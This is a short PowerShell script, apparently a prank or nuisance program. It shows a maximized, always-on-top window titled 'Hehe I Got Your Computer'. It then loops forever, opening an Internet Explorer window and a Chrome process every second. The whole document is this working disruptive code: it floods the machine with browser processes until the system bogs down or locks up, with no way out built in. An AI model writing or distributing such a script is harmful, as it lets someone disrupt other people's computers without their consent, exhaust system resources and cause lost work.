Add-Type -AssemblyName PresentationFramework
$popup = New-Object System.Windows.Window
$popup.Title = "Hehe I Got Your Computer"
$popup.WindowStyle = 'ToolWindow'
$popup.WindowStartupLocation = 'CenterScreen'
$popup.SizeToContent = 'WidthAndHeight'
$popup.Topmost = $true
$popup.ResizeMode = 'NoResize'
$popup.WindowState = 'Maximized'
$popup.ShowDialog()

do {
    $ie = New-Object -com "InternetExplorer.Application"
    $ie.Visible = $true
    $ie.Navigate2("https://www.google.com")
    $chrome = Start-Process "chrome.exe" -PassThru
    $chrome.ProcessName
    Start-Sleep -Seconds 1
} while ($true)
